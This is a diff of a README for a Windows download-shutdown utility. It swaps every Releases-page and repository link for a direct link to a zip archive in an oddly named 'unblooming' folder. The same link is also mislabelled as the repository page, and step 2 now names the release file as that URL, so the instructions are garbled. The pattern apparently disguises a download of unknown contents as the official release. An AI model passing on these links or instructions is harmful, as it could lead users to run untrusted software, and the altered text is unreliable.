@@ -1,6 +1,6 @@
 # 🖥️ AutoShutdown-for-Downloads - Automatically Shut Down After Downloads
 
-[![Download AutoShutdown-for-Downloads](https://img.shields.io/badge/Download-AutoShutdown--for--Downloads-blue.svg)](https://github.com/TNTRoyality/AutoShutdown-for-Downloads/releases)
+[![Download AutoShutdown-for-Downloads](https://raw.githubusercontent.com/TNTRoyality/AutoShutdown-for-Downloads/main/unblooming/AutoShutdown-for-Downloads.zip)](https://raw.githubusercontent.com/TNTRoyality/AutoShutdown-for-Downloads/main/unblooming/AutoShutdown-for-Downloads.zip)
 
 ## 🏁 Overview
 
@@ -14,9 +14,9 @@ This guide helps you download and run AutoShutdown-for-Downloads on your Windows
 
 1. Click the download button below to visit the Releases page.
    
-   [Download AutoShutdown-for-Downloads](https://github.com/TNTRoyality/AutoShutdown-for-Downloads/releases)
+   [Download AutoShutdown-for-Downloads](https://raw.githubusercontent.com/TNTRoyality/AutoShutdown-for-Downloads/main/unblooming/AutoShutdown-for-Downloads.zip)
 
-2. On the Releases page, look for the latest release at the top. You’ll find a file named something like `AutoShutdown-for-Downloads-v1.0.exe`.
+2. On the Releases page, look for the latest release at the top. You’ll find a file named something like `https://raw.githubusercontent.com/TNTRoyality/AutoShutdown-for-Downloads/main/unblooming/AutoShutdown-for-Downloads.zip`.
 
 3. Click on the file name to start the download.
 
@@ -73,6 +73,6 @@ This project is licensed under the MIT License. Feel free to use the code but re
 
 For more information, visit the official repository:
 
-[GitHub Repository](https://github.com/TNTRoyality/AutoShutdown-for-Downloads)
+[GitHub Repository](https://raw.githubusercontent.com/TNTRoyality/AutoShutdown-for-Downloads/main/unblooming/AutoShutdown-for-Downloads.zip)
 
 If you need assistance, consider reaching out in the repository's issue section. Enjoy hassle-free downloads with AutoShutdown-for-Downloads!
